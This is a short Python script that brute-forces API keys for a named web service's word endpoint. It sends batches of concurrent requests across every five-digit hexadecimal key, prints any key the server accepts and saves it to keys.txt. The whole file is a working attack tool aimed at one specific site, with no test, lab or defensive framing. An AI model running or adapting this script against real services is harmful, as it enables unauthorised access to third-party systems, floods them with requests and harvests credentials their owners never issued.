from typing import Optional
import asyncio
import aiohttp
import sys


async def test_key(http: aiohttp.ClientSession, k: str) -> Optional[str]:
    res = await http.get(f"http://clemsonhackman.com/api/word?key={k}")

    if res.status == 200:
        return k
    elif res.status != 403:
        print(f"\nUh oh: {res.status}")
        print(await res.json())


async def main():
    try:
        batch_start_at = int(sys.argv[1])
    except (IndexError, ValueError):
        batch_start_at = 0

    keys = [hex(i).lstrip("0x").upper() for i in range(65536, 1048576)]
    keys = [keys[i : i + 15] for i in range(0, len(keys), 15)][batch_start_at:]

    http = aiohttp.ClientSession()

    for i, key_batch in enumerate(keys):
        print(f"Batch {i+1+batch_start_at}/{len(keys)+batch_start_at}", end="\r")

        for k in asyncio.as_completed([test_key(http, k) for k in key_batch]):
            k = await k

            if k:
                print(f"\nFOUND: {k}")

                with open("keys.txt", "a") as f:
                    f.write(f"\n{k}")

    await http.close()


if __name__ == "__main__":
    asyncio.run(main())
